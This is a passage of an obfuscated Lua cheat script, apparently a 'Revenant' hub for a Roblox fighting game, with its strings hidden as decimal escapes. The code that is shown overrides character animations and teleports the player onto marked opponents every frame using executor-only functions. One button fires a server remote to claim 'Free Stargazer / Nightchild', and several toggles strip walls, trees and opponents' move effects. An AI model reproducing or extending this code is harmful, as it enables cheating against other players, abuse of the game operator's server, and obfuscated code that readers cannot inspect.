= nil, stopAfter = 0x1, stopFade = 0.2 }, { _lIIIIllIIl = "\075\105\099\107", _IlIIIllllI = "\049\056\056\057\055\054\052\056\052\052\054", timePos = 3.1, _IllIIllIlI = 1.5, stopAfter = nil }, { _lIIIIllIIl = "\080\111\105\110\116", _IlIIIllllI = "\049\052\052\057\056\050\057\053\051\054\048", timePos = nil, _IllIIllIlI = 0x2, stopAfter = 0x1, stopFade = 0.4 }, { _lIIIIllIIl = "\082\097\118\097\103\105\110\103\032\075\105\099\107", _IlIIIllllI = "\049\054\057\052\053\053\053\048\048\050\057", timePos = 0x4, _IllIIllIlI = 1.8, stopAfter = nil, speed2 = 1.2, speed2trigger = 5.1 }, { _lIIIIllIIl = "\083\116\114\101\110\103\116\104\110\101\115\115", _IlIIIllllI = "\049\052\048\049\054\052\054\052\050\048\052\055\049\056\056", timePos = 6.9, _IllIIllIlI = nil, stopAfter = 0.4, stopFade = 0.2, id2 = "\055\057\055\054\049\056\048\054\055\048\054\051\056\050", timePos2 = 0x3 }, { _lIIIIllIIl = "\071\111\100\039\115\032\070\101\097\114", _IlIIIllllI = "\049\050\057\049\050\051\057\054\048\055\052\050\052\051\056", timePos = 11.48, _IllIIllIlI = 1.5, stopAfter = nil, stopFade = 0.1 }, { _lIIIIllIIl = "\084\104\101\032\082\105\103\104\116\032\087\097\121", _IlIIIllllI = "\049\050\053\050\054\053\052\053\057\056\056\054\056\054\051", timePos = 0x8, _IllIIllIlI = 1.8, stopAfter = nil, stopFade = 0.2 }, }, ["\067\080"] = { { _lIIIIllIIl = "\066\108\117\101", _IlIIIllllI = "\049\051\053\054\048\051\048\054\053\049\048", timePos = nil, _IllIIllIlI = 2.7, stopAfter = nil }, { _lIIIIllIIl = "\066\097\114\114\097\103\101",_IlIIIllllI = "\049\054\057\052\053\053\053\048\048\050\057", timePos = 0x2, _IllIIllIlI = nil, stopAfter = nil, stopTrigger = 3.6, stopFade = 0.5 }, { _lIIIIllIIl = "\070\117\114\121", _IlIIIllllI = "\049\050\050\055\051\049\056\056\055\053\052", timePos = nil, _IllIIllIlI = 0x2, stopAfter = nil, cpLoop = true }, { _lIIIIllIIl = "\071\111\100\032\083\108\097\121\101\114", _IlIIIllllI = "\049\050\057\049\050\051\057\054\048\055\052\050\052\051\056", timePos = 9.20, _IllIIllIlI = nil, stopAfter = nil, stopTrigger = 10.8, stopFade = 0.1 }, { _lIIIIllIIl = "\070\105\115\115\105\111\110", _IlIIIllllI = "\055\049\049\056\049\048\049\053\052\052\051\048\051\048", timePos = 4.9, _IllIIllIlI = nil, stopAfter = nil, stopFade = 0.1 }, { _lIIIIllIIl = "\082\105\112\112\105\110\103\032\070\105\115\116", _IlIIIllllI = "\049\050\053\050\054\053\052\053\057\056\056\054\056\054\051", timePos = 1.65, _IllIIllIlI = 1.5, stopAfter = nil, stopTrigger = 4.25, stopFade = 0.2 }, { _lIIIIllIIl = "\070\105\110\105\115\104\105\110\039", _IlIIIllllI = "\055\053\049\050\055\053\055\054\056\052\049\049\053\057", timePos = 1.1, _IllIIllIlI = 0x2, stopAfter = nil, stopFade = 0.2 }, }, ["\083\072"] = { { _lIIIIllIIl = "\083\108\097\112", _IlIIIllllI = "\049\056\052\052\048\051\056\057\057\051\048", timePos = 1.2, _IllIIllIlI = nil, stopAfter = 0.6, stopFade = 0.4 }, { _lIIIIllIIl = "\075\105\099\107", _IlIIIllllI = "\049\056\049\056\049\051\052\056\052\052\054", timePos = nil, _IllIIllIlI = nil, stopAfter = nil }, { _lIIIIllIIl = "\086\097\110\105\115\104\105\110\103", _IlIIIllllI = "\049\056\056\057\055\049\049\056\053\048\055", timePos = 2.2, _IllIIllIlI = 0x1, stopAfter = nil, id2 = "\049\055\056\051\056\054\049\057\056\057\053", timePos2 = 0.45 }, { _lIIIIllIIl = "\083\119\101\101\112", randIds = { "\049\054\057\052\052\050\054\053\054\051\053", "\049\054\057\052\052\051\052\053\054\049\057" }, timePos = nil, _IllIIllIlI = nil, stopAfter = nil }, { _lIIIIllIIl = "\082\097\103\101", _IlIIIllllI = "\055\057\055\054\049\056\048\054\055\048\054\051\056\050", timePos = 2.7, _IllIIllIlI = nil, stopAfter = nil }, { _lIIIIllIIl = "\082\101\118\101\114\115\101", _IlIIIllllI = "\049\053\049\050\052\055\054\050\048\056\056", timePos = nil, _IllIIllIlI = nil, stopAfter = nil }, }, ["\085\067"] = { { _lIIIIllIIl = "\078\101\099\107\032\068\101\115\116\114\111\121\101\114", _IlIIIllllI = "\049\056\049\055\057\049\056\049\054\054\051", timePos = nil, _IllIIllIlI = nil, stopAfter = nil }, { _lIIIIllIIl = "\084\104\114\111\119", _IlIIIllllI = "\049\051\054\051\055\048\055\051\055\054\051\051\054\052\057", timePos = 0x1, _IllIIllIlI = nil, stopAfter = 0x1, stopFade = 0.45 }, { _lIIIIllIIl = "\074\097\119\032\066\114\101\097\107\101\114", _IlIIIllllI = "\057\055\051\052\055\052\052\051\053\057\055\057\052\055", timePos = 3.6, _IllIIllIlI = 0.9, stopAfter = nil, stopFade = 0.1 }, }, } _IIIlIIlllI:AddToggle("\067\117\115\116\111\109\083\097\105\116\097\109\097\069\110\097\098\108\101\100", { Text = "\069\110\097\098\108\101\032\067\117\115\116\111\109\032\083\097\105\116\097\109\097\032\065\110\105\109\115", Default = false, }) _IIIlIIlllI:AddDivider() for _lIIlIllIlI, _IIIIllllII in ipairs(_IlIIlIllIl) do local _llllIIlIll = _IIllIllIII[_IIIIllllII.key] local _llIIIIIIll = { "\068\101\102\097\117\108\116", "\082\097\110\100\111\109" } for _lIIlIllIlI, _lIllllllII in ipairs(_llllIIlIll) do table.insert(_llIIIIIIll, _lIllllllII.name) end
 _IIIlIIlllI:AddDropdown("\067\083\065\095" .. _IIIIllllII.key, { Text = _IIIIllllII.label, Values = _llIIIIIIll, Default = 0x1, Multi = false, Searchable = false, }) if _IIIIllllII.key == "\067\080" then _IIIlIIlllI:AddToggle("\078\111\066\097\114\114\097\103\101\065\114\109\115", { Text = "\082\101\109\111\118\101\032\066\097\114\114\097\103\101\032\065\114\109\115", Default = false, }) end
 end
 local _IlIIllIIII = nil local _IllIllIIII = nil local _IllllIllII = nil local _lIIlllIlII = nil local function _lIlIllllIl(_IIllIIlllI) if _lIIlllIlII then _lIIlllIlII:Disconnect() _lIIlllIlII = nil end
 if not _IIllIIlllI then return end
 _lIIlllIlII = _IIllIIlllI.ChildAdded:Connect( function (_IIIlIIIlII) if not _llIIllIlll.NoBarrageArms.Value then return end
 if _llIlIIlIll:GetAttribute("\067\104\097\114\097\099\116\101\114") ~= "\066\097\108\100" then return end
 if _IIIlIIIlII.Name ~= "\066\097\114\114\097\103\101\066\105\110\100" then return end
 pcall( function () _IIIlIIIlII:SetAttribute("\084\105\109\101\115", nil) end
 ) task.defer( function () pcall( function () _IIIlIIIlII:Destroy() end
 ) end
 ) end
 ) for _lIIlIllIlI, _IIIlIIIlII in pairs(_IIllIIlllI:GetChildren()) do if _IIIlIIIlII.Name == "\066\097\114\114\097\103\101\066\105\110\100" then if _llIlIIlIll:GetAttribute("\067\104\097\114\097\099\116\101\114") ~= "\066\097\108\100" then break end
 pcall( function () _IIIlIIIlII:SetAttribute("\084\105\109\101\115", nil) end
 ) task.defer( function () pcall( function () _IIIlIIIlII:Destroy() end
 ) end
 ) end
 end
 end
 local function _IIIlllIllI(_IIllIIlllI) local _IllIIIIIlI = nil local function _IIlIIlIllI(obj) if obj:IsA("\066\111\100\121\086\101\108\111\099\105\116\121") then obj.Velocity = Vector3.new(obj.Velocity.X, 0x0, obj.Velocity.Z) end
 end
 _IllIIIIIlI = _IIllIIlllI.DescendantAdded:Connect(_IIlIIlIllI) for _lIIlIllIlI, _llIIIlIIIl in pairs(_IIllIIlllI:GetDescendants()) do _IIlIIlIllI(_llIIIlIIIl) end
 return _IllIIIIIlI end
 local function _llIIIIIIII(_lIlIIllIII) if _IlIIllIIII then _IlIIllIIII:Disconnect() _IlIIllIIII = nil end
 _IllllIllII = _lIlIIllIII if not _lIlIIllIII then return end
 _IlIIllIIII = _lIlIIllIII.AnimationPlayed:Connect( function (_IlIlIlIlIl) if not _llIIllIlll.CustomSaitamaEnabled.Value then return end
 local _IIIIIIIlII = _IlIlIlIlIl.Animation and _IlIlIlIlIl.Animation.AnimationId or "" local _IIIIIIlIII = _IIIIIIIlII:match("\037\100\043") if not _IIIIIIlIII then return end
 local _IIIIllllII = nil for _lIIlIllIlI, _IllIIIllII in ipairs(_IlIIlIllIl) do if _IIIIIIlIII == _IllIIIllII.trigger then _IIIIllllII = _IllIIIllII break end
 end
 if not _IIIIllllII then return end
 local _IlIIIllIIl = _lIIlIllIlI["\067\083\065\095" .. _IIIIllllII.key] and _lIIlIllIlI["\067\083\065\095" .. _IIIIllllII.key].Value or "\068\101\102\097\117\108\116" if _IlIIIllIIl == "\068\101\102\097\117\108\116" then return end
 local _llllIIlIll = _IIllIllIII[_IIIIllllII.key] local _llIlIllIll = nil if _IlIIIllIIl == "\082\097\110\100\111\109" then _llIlIllIll = _llllIIlIll[math.random(0x1, #_llllIIlIll)] else for _lIIlIllIlI, _lIllllllII in ipairs(_llllIIlIll) do if _lIllllllII.name == _IlIIIllIIl then _llIlIllIll = _lIllllllII break end
 end
 end
 if not _llIlIllIll then return end
 _IlIlIlIlIl:AdjustWeight(-0x98967F, 0x0) local _IIllIIlllI = _llIlIIlIll.Character local _IIIIIIIIIl = (_IIllIIlllI and _llIlIllIll.bv) and _IIIlllIllI(_IIllIIlllI) or nil local _IIIIIIIlII = _llIlIllIll.id if _llIlIllIll.randIds then _IIIIIIIlII = _llIlIllIll.randIds[math.random(0x1, #_llIlIllIll.randIds)] end
 local _IlIllllIlI = Instance.new("\065\110\105\109\097\116\105\111\110") _IlIllllIlI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IIIIIIIlII local _lIIIllIIll = _lIlIIllIII:LoadAnimation(_IlIllllIlI) _lIIIllIIll.Priority = Enum.AnimationPriority.Action3 _lIIIllIIll:Play(0.1) if _llIlIllIll.speed then _lIIIllIIll:AdjustSpeed(_llIlIllIll.speed) end
 if _llIlIllIll.timePos then _lIIIllIIll.TimePosition = _llIlIllIll.timePos end
 _IlIlIlIlIl.Stopped:Connect( function () pcall( function () _lIIIllIIll:Stop(_llIlIllIll.stopFade or 0.25) end
 ) end
 ) if _llIlIllIll.id2 then task.spawn( function () local function _llIIIIllll() local _IllIIlIlIl = Instance.new("\065\110\105\109\097\116\105\111\110") _IllIIlIlIl.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _llIlIllIll.id2 local _lllIllllII = _lIlIIllIII:LoadAnimation(_IllIIlIlIl) _lllIllllII.Priority = Enum.AnimationPriority.Action3 _lllIllllII:Play(_llIlIllIll.stopFade or 0.1) if _llIlIllIll.timePos2 then _lllIllllII.TimePosition = _llIlIllIll.timePos2 end
 _lllIllllII.Stopped:Connect( function () if _IIIIIIIIIl then _IIIIIIIIIl:Disconnect() _IIIIIIIIIl = nil end
 end
 ) end
 if _llIlIllIll.stopAfter then task.wait(_llIlIllIll.stopAfter) if _lIIIllIIll.IsPlaying then pcall( function () _lIIIllIIll:Stop(_llIlIllIll.stopFade or 0x0) end
 ) end
 _llIIIIllll() else repeat task.wait() until _lIIIllIIll.TimePosition >= 2.25 or not _lIIIllIIll.IsPlaying _lIIIllIIll:Stop(0x0) _llIIIIllll() end
 end
 ) else if _llIlIllIll.speed2 and _llIlIllIll.speed2trigger then task.spawn( function () repeat task.wait() until _lIIIllIIll.TimePosition >= _llIlIllIll.speed2trigger or not _lIIIllIIll.IsPlaying if _lIIIllIIll.IsPlaying then _lIIIllIIll:AdjustSpeed(_llIlIllIll.speed2) end
 end
 ) end
 if _llIlIllIll.stopTrigger then task.spawn( function () repeat task.wait() until _lIIIllIIll.TimePosition >= _llIlIllIll.stopTrigger or not _lIIIllIIll.IsPlaying pcall( function () _lIIIllIIll:Stop(_llIlIllIll.stopFade or 0x0) end
 ) end
 ) elseif _llIlIllIll.stopAfter then task.delay(_llIlIllIll.stopAfter, function () pcall( function () _lIIIllIIll:Stop(_llIlIllIll.stopFade or 0x1) end
 ) end
 ) end
 if _llIlIllIll.cpLoop then task.spawn( function () for _lIIlIllIlI = 0x1, 0x4 do repeat task.wait() until _lIIIllIIll.TimePosition >= 0.9 or not _lIIIllIIll.IsPlaying if not _lIIIllIIll.IsPlaying then break end
 _lIIIllIIll.TimePosition = 0.6 end
 end
 ) end
 _lIIIllIIll.Stopped:Connect( function () if _IIIIIIIIIl then _IIIIIIIIIl:Disconnect() _IIIIIIIIIl = nil end
 end
 ) end
 end
 ) end
 _IllIllIIII = RunService.Heartbeat:Connect( function () local _IIllIIlllI = _llIlIIlIll.Character if not _IIllIIlllI then return end
 local _lIlIIllIII = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _lIlIIllIII ~= _IllllIllII then _llIIIIIIII(_lIlIIllIII) _lIlIllllIl(_IIllIIlllI) end
 end
 ) table.insert(_IllIllIIll, function () if _IlIIllIIII then _IlIIllIIII:Disconnect() _IlIIllIIII = nil end
 if _IllIllIIII then _IllIllIIII:Disconnect() _IllIllIIII = nil end
 if _lIIlllIlII then _lIIlllIlII:Disconnect() _lIIlllIlII = nil end
 _IllllIllII = nil pcall( function () _llIIllIlll.CustomSaitamaEnabled:SetValue(false) end
 ) pcall( function () _llIIllIlll.NoBarrageArms:SetValue(false) end
 ) end
 ) end
 local _IlIllIIlIl = false local _lIIIlllIlI = false getgenv()._revenantDashCooldown = false getgenv()._revenantDashCooldownUntil = nil getgenv()._revenantTechActive = false getgenv()._wcDashOnCooldown = false getgenv()._revenantTechFiring = false local _IlIlIIIlII = {} local function _IIIIlIllIl(_IIllIIlllI) for _lIIlIllIlI, _IlIlIllIll in ipairs(_IlIlIIIlII) do pcall( function () _IlIlIllIll:Disconnect() end
 ) end
 _IlIlIIIlII = {} if not _IIllIIlllI then return end
 local _lIlIIllIII = _IIllIIlllI:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _lIlIIllIII then return end
 local function _IllllIIIll(_IlIlIlIlIl) if not _IlIlIlIlIl or not _IlIlIlIlIl.Animation then return end
 local _IlIIIllllI = tostring(_IlIlIlIlIl.Animation.AnimationId or "") if _IlIIIllllI:find("\049\048\052\055\057\051\051\053\051\057\055",0x1,true) or _IlIIIllllI:find("\049\052\051\053\055\057\052\051\052\056\055",0x1,true) or _IlIIIllllI:find("\049\051\051\056\048\050\053\053\055\053\049",0x1,true) or _IlIIIllllI:find("\049\048\052\057\049\057\057\051\054\056\050",0x1,true) then _IlIllIIlIl = true _lIIIlllIlI = true getgenv()._wcDashOnCooldown = true task.delay(0x6, function () _IlIllIIlIl = false _lIIIlllIlI = false getgenv()._wcDashOnCooldown = false end
 ) end
 end
 table.insert(_IlIlIIIlII, _lIlIIllIII.AnimationPlayed:Connect(_IllllIIIll)) local _IIlIIIIIIl = _lIlIIllIII:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if _IIlIIIIIIl then table.insert(_IlIlIIIlII, _IIlIIIIIIl.AnimationPlayed:Connect(_IllllIIIll)) end
 end
 task.spawn( function () _IIIIlIllIl(_llIlIIlIll.Character) end
 ) _llIlIIlIll.CharacterAdded:Connect( function (_IIllIIlllI) task.spawn( function () task.wait(0.1) _IIIIlIllIl(_IIllIIlllI) end
 ) end
 ) table.insert(_IllIllIIll, function () for _lIIlIllIlI, _IlIlIllIll in ipairs(_IlIlIIIlII) do pcall( function () _IlIlIllIll:Disconnect() end
 ) end
 _IlIlIIIlII = {} _IlIllIIlIl = false _lIIIlllIlI = false getgenv()._revenantDashCooldown = false getgenv()._revenantDashCooldownUntil = nil end
 ) do local _llIllllIIl = false local _lIIIlIlIll = nil local _lIIIlIIIlI = nil local _IlIlIIIIlI = "\049\048\055\052\056\052\051\051\057\052\057\053\056\049\049" local function _IIIlllIIII() local _lllIlllIII = {} local _IIIlIIllll = workspace:FindFirstChild("\076\105\118\101") if not _IIIlIIllll then return _lllIlllIII end
 local _IlIIIllIIl = _llIlIIlIll.Character for _lIIlIllIlI, _IIIIlllIlI in pairs(_IIIlIIllll:GetChildren()) do if _IIIIlllIlI ~= _IlIIIllIIl and _IIIIlllIlI:FindFirstChild("\079\107") then table.insert(_lllIlllIII, _IIIIlllIlI) end
 end
 return _lllIlllIII end
 _IIIIIIllll:AddToggle("\065\117\116\111\071\111\100\115\108\097\121\101\114\084\080", { Text = "\065\117\116\111\032\067\111\115\109\105\099\032\071\097\114\111\117", Tooltip = "\073\102\032\121\111\117\032\109\097\114\107\032\115\111\109\101\111\110\101\032\117\115\105\110\103\032\072\117\110\116\101\114\115\032\077\097\114\107\032\097\110\100\032\117\115\101\032\071\111\100\115\108\097\121\101\114\032\116\104\105\115\032\119\105\108\108\032\097\117\116\111\109\097\116\105\099\097\108\108\121\032\116\101\108\101\112\111\114\116\032\116\111\032\115\111\109\101\111\110\101\032\116\104\097\116\032\105\115\032\109\097\114\107\101\100", Default = false, Callback = function (_IIlIlIIlII) _llIllllIIl = _IIlIlIIlII if _IIlIlIIlII then if _lIIIlIlIll then _lIIIlIlIll:Disconnect() end
 _lIIIlIlIll = RunService.Heartbeat:Connect( function () local _IlIlIllIll = _llIlIIlIll.Character if not _IlIlIllIll then return end
 if _IlIlIllIll:GetAttribute("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") then return end
 local _lIlIIllIII = _IlIlIllIll:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _lIlIIllIII or _lIlIIllIII.Health <= 0x0 then return end
 local _IIlIIIIIIl = _lIlIIllIII:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") if not _IIlIIIIIIl then return end
 for _lIIlIllIlI, _IlIlIlIlIl in pairs(_IIlIIIIIIl:GetPlayingAnimationTracks()) do if _IlIlIlIlIl.Animation and _IlIlIlIlIl.Animation.AnimationId:match(_IlIlIIIIlI) and _IlIlIlIlIl.TimePosition >= 0.30 then local _IIIlIIllll = workspace:FindFirstChild("\076\105\118\101") local _lIIIlIlIIl = false if _lIIIlIIIlI and _IIIlIIllll then _lIIIlIlIIl = _lIIIlIIIlI.Parent == _IIIlIIllll and _lIIIlIIIlI:FindFirstChild("\079\107") ~= nil end
 if not _lIIIlIlIIl then local _lllIlllIII = _IIIlllIIII() _lIIIlIIIlI = #_lllIlllIII > 0x0 and _lllIlllIII[0x1] or nil end
 if not _lIIIlIIIlI then return end
 local _lllllIlIIl = _lIIIlIIIlI:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _lllllIlIIl then local _llIllIlIll = _lllllIlIIl.CFrame * CFrame.new(0x0, 0x0, 0x2) local _IIIlIIIIIl = _llIlIIlIll.Character and _llIlIIlIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IlllIlIlII and _IIIlIIIIIl then _IIIlIIIIIl.CFrame = _llIllIlIll _IIIlIIIIIl.AssemblyLinearVelocity = Vector3.zero _IIIlIIIIIl.AssemblyAngularVelocity = Vector3.zero pcall( function () sethiddenproperty(_IIIlIIIIIl, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _lllllIlIIl) end
 ) RunService.Heartbeat:Once( function () pcall( function () sethiddenproperty(_IIIlIIIIIl, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 ) else RunService.Heartbeat:Once( function () RunService.Heartbeat:Once( function () local _IlllIIlIlI = _llIlIIlIll.Character and _llIlIIlIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IlllIIlIlI then _IlllIIlIlI.CFrame = _llIllIlIll end
 end
 ) end
 ) end
 end
 return end
 end
 end
 ) else if _lIIIlIlIll then _lIIIlIlIll:Disconnect() _lIIIlIlIll = nil end
 _lIIIlIIIlI = nil end
 end
 , }) table.insert(_IllIllIIll, function () _llIllllIIl = false _lIIIlIIIlI = nil if _lIIIlIlIll then _lIIIlIlIll:Disconnect() _lIIIlIlIll = nil end
 pcall( function () _llIIllIlll.AutoGodslayerTP:SetValue(false) end
 ) end
 ) end
 if _lllIIllIII then _IIIIIIllll:AddButton({ Text = "\070\114\101\101\032\083\116\097\114\103\097\122\101\114\032\047\032\078\105\103\104\116\099\104\105\108\100", Func = function () local _IIllIIlllI = _llIlIIlIll.Character local _llIIlIIIll = _IIllIIlllI and _IIllIIlllI:FindFirstChild("\067\111\109\109\117\110\105\099\097\116\101") if _llIIlIIIll then _llIIlIIIll:FireServer({ Goal = "\071\097\122\101" }) end
 end
 , }) end
 end
 , tostring) if not _IIlIlIlIlI then warn("\091\082\101\118\101\110\097\110\116\032\070\069\065\084\085\082\069\083\032\069\082\082\079\082\093\058\032" .. tostring(_featErr)) end
 do local function _lllIIlIIII(optKey, togKey) local _IIIIlIIlll = _llIIllIlll[togKey] if not _IIIIlIIlll then return end
 local function _IIlllIIlII(_IIlIlIIlII) local _IlIIIllIIl = _lIIlIllIlI[optKey] if _IlIIIllIIl and type(_IlIIIllIIl.KeybindsToggle) == "\116\097\098\108\101" then _IlIIIllIIl.KeybindsToggle:SetVisibility(_IIlIlIIlII == true) end
 end
 _IIlllIIlII(_IIIIlIIlll.Value) _IIIIlIIlll:OnChanged(_IIlllIIlII) end
 _lllIIlIIII("\082\101\118\101\110\097\110\116\070\108\121\066\105\110\100", "\082\101\118\101\110\097\110\116\070\108\121") _lllIIlIIII("\065\110\105\109\101\084\080\075\101\121\098\105\110\100", "\065\110\105\109\101\084\101\108\101\112\111\114\116\097\116\105\111\110") _lllIIlIIII("\076\045\079\110\075\101\121\098\105\110\100", "\076\111\099\107\045\111\110") _lllIIlIIII("\075\080\073\110\118\105\115", "\084\111\103\073\110\118\105\115") _lllIIlIIII("\075\080\072\101\097\100\070\108\111\097\116", "\084\111\103\072\101\097\100\070\108\111\097\116") _lllIIlIIII("\075\080\074\101\114\107", "\084\111\103\074\101\114\107") _lllIIlIIII("\075\080\066\097\110\103", "\084\111\103\066\097\110\103") _lllIIlIIII("\075\080\084\080\111\115\101", "\084\111\103\084\080\111\115\101") _lllIIlIIII("\075\080\070\085\067", "\084\111\103\070\085\067") _lllIIlIIII("\084\111\117\099\104\070\108\105\110\103\066\105\110\100", "\084\111\117\099\104\070\108\105\110\103\069\110\097\098\108\101\100") _lllIIlIIII("\075\080\087\101\108\100", "\084\111\103\087\101\108\100") end
 _IlIllIIIlI:LoadAutoloadConfig() if getgenv()._disguiseAutoApply then getgenv()._disguiseAutoApply() end
 end
 ) if _lIIIIIIllI[_llIIlIIIlI] then local _IlIIlIIlIl = Instance.new("\070\111\108\100\101\114") _IlIIlIIlIl.Name = "\082\101\109\111\118\101\100\084\114\101\101\115" _IlIIlIIlIl.Parent = game:GetService("\067\111\114\101\071\117\105") local _IIIlIllIIl = Instance.new("\070\111\108\100\101\114") _IIIlIllIIl.Name = "\082\101\109\111\118\101\100\087\097\108\108\115" _IIIlIllIIl.Parent = game:GetService("\067\111\114\101\071\117\105") local _IIIIIIllIl = game:GetService("\076\105\103\104\116\105\110\103") _llIlIIlIIl:AddToggle("\078\111\087\097\108\108\115", { Text = "\078\111\032\087\097\108\108\115", Default = false, Callback = function (_IIlIlIIlII) local _IIIlllIlII = workspace:FindFirstChild("\077\097\112") if not _IIIlllIlII then return end
 if _IIlIlIIlII then for _lIIlIllIlI, _IIIlIIIlII in pairs(_IIIlllIlII:GetChildren()) do if table.find({"\087\097\108\108\115","\071\114\097\115\115\084\111\112","\084\117\110\110\101\108","\080\097\114\116"}, _IIIlIIIlII.Name) then _IIIlIIIlII.Parent = _IIIlIllIIl end
 end
 else for _lIIlIllIlI, _IIIlIIIlII in pairs(_IIIlIllIIl:GetChildren()) do _IIIlIIIlII.Parent = workspace.Map end
 end
 end
 , }) _llIlIIlIIl:AddToggle("\078\111\084\114\101\101\115", { Text = "\078\111\032\084\114\101\101\115", Default = false, Callback = function (_IIlIlIIlII) local _llIIlIIlII = workspace:FindFirstChild("\077\097\112") and workspace.Map:FindFirstChild("\084\114\101\101\115") if not _llIIlIIlII then return end
 if _IIlIlIIlII then for _lIIlIllIlI, _IIIlIIIlII in pairs(_llIIlIIlII:GetChildren()) do _IIIlIIIlII.Parent = _IlIIlIIlIl end
 else for _lIIlIllIlI, _IIIlIIIlII in pairs(_IlIIlIIlIl:GetChildren()) do _IIIlIIIlII.Parent = workspace.Map.Trees end
 end
 end
 , }) if workspace:FindFirstChild("\077\097\112") and workspace.Map:FindFirstChild("\084\114\101\101\115") then workspace.Map.Trees.ChildAdded:Connect( function (p738) if _llIIllIlll.NoTrees.Value then RunService.RenderStepped:Wait() p738.Parent = _IlIIlIIlIl end
 end
 ) end
 local function _llIIllIIlI(inst, newInstance) task.wait() local _llllIlllll = inst.Parent inst:Destroy() if newInstance then warn("\073\110\115\116\097\110\099\101\032\114\101\109\111\118\101\100\044\032\078\097\109\101\058", inst.Name, "\067\108\097\115\115\078\097\109\101\058", inst.ClassName, "\080\097\114\101\110\116\058", _llllIlllll) end
 end
 _llIlIIlIIl:AddToggle("\078\111\068\101\098\114\105\115", { Text = "\078\111\032\068\101\098\114\105\115", Default = false, Callback = function (_IIlIlIIlII) if _IIlIlIIlII then local _IIlllllIlI = workspace:FindFirstChild("\084\104\114\111\119\110") if _IIlllllIlI then for _lIIlIllIlI, _IIIlIIIlII in pairs(_IIlllllIlI:GetChildren()) do if _IIIlIIIlII.Name:lower():find("\100\101\098\114\105\115") or _IIIlIIIlII.Name:lower() == "\112\097\114\116" then task.spawn(pcall, _llIIllIIlI, _IIIlIIIlII) end
 end
 end
 end
 end
 , }) _llIlIIlIIl:AddToggle("\078\111\083\109\111\107\101", { Text = "\078\111\032\083\109\111\107\101", Default = false, Callback = function (_IIlIlIIlII) if _IIlIlIIlII then local _IIlllllIlI = workspace:FindFirstChild("\084\104\114\111\119\110") if _IIlllllIlI then for _lIIlIllIlI, _IIIlIIIlII in pairs(_IIlllllIlI:GetChildren()) do if _IIIlIIIlII.Name:lower():find("\115\109\111\107\101") then task.spawn(pcall, _llIIllIIlI, _IIIlIIIlII) end
 end
 end
 end
 end
 , }) _llIlIIlIIl:AddToggle("\078\111\069\120\112\108\111\115\105\111\110\115", { Text = "\078\111\032\069\120\112\108\111\115\105\111\110\115", Default = false, Callback = function (_IIlIlIIlII) if _IIlIlIIlII then local _IIlllllIlI = workspace:FindFirstChild("\084\104\114\111\119\110") if _IIlllllIlI then for _lIIlIllIlI, _IIIlIIIlII in pairs(_IIlllllIlI:GetChildren()) do if _IIIlIIIlII.Name:lower():find("\101\120\112\108\111") then task.spawn(pcall, _llIIllIIlI, _IIIlIIIlII) end
 end
 end
 end
 end
 , }) workspace.ChildAdded:Connect( function (_IIIlIIIlII) if _IIIlIIIlII.Name:lower() == "\097\100\106\117\115\116\101\100\104\098" and rawget(_lIIlIllIlI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\083\116\111\110\101\032\071\114\097\118\101") then task.spawn(pcall, _llIIllIIlI, _IIIlIIIlII, false) end
 end
 ) local function _lIIlIlllll(_IIlllllIlI) _IIlllllIlI.ChildAdded:Connect( function (_IIIlIIIlII) if (_IIIlIIIlII.Name:lower():find("\100\101\098\114\105\115") or _IIIlIIIlII.Name:lower() == "\112\097\114\116") and _llIIllIlll.NoDebris.Value then task.spawn(pcall, _llIIllIIlI, _IIIlIIIlII, false) elseif _IIIlIIIlII.Name:lower():find("\116\114\101\101") and _llIIllIlll.NoTrees.Value then task.spawn(pcall, _llIIllIIlI, _IIIlIIIlII, false) elseif _IIIlIIIlII.Name:lower():find("\115\109\111\107\101") and _llIIllIlll.NoSmoke.Value then task.spawn(pcall, _llIIllIIlI, _IIIlIIIlII, false) elseif _IIIlIIIlII.Name:lower():find("\101\120\112\108\111") and _llIIllIlll.NoExplosions.Value then task.spawn(pcall, _llIIllIIlI, _IIIlIIIlII, false) elseif table.find({"\098\101\097\109\101\100","\097\100\106\117\115\116\101\100"}, _IIIlIIIlII.Name:lower()) then if rawget(_lIIlIllIlI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\083\116\111\110\101\032\071\114\097\118\101") then for _lIIlIllIlI, _lIllllllII in pairs(_IIIlIIIlII:GetDescendants()) do if _lIllllllII:IsA("\066\097\115\101\080\097\114\116") then _lIllllllII.Transparency = 0.8 _lIllllllII.CollisionGroup = "\117\110\116\111\117\099\104\097\098\108\101" _lIllllllII.Massless = true _lIllllllII.CanCollide = false _lIllllllII.CanTouch = false _lIllllllII.CanQuery = false end
 end
 end
 elseif (_IIIlIIIlII:IsA("\080\097\114\116") and (_IIIlIIIlII.Size == Vector3.new(0x14,0x14,0x14) and _IIIlIIIlII.Shape == Enum.PartType.Ball) or _IIIlIIIlII.Name == "\080\097\114\116") and rawget(_lIIlIllIlI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\083\116\111\110\101\032\071\114\097\118\101") then task.spawn(pcall, _llIIllIIlI, _IIIlIIIlII, false) end
 end
 ) end
 local _IllIlIlllI = workspace:FindFirstChild("\084\104\114\111\119\110") if _IllIlIlllI then _lIIlIlllll(_IllIlIlllI) else workspace.ChildAdded:Connect( function (_IIIlIIIlII) if _IIIlIIIlII.Name == "\084\104\114\111\119\110" then _lIIlIlllll(_IIIlIIIlII) end
 end
 ) end
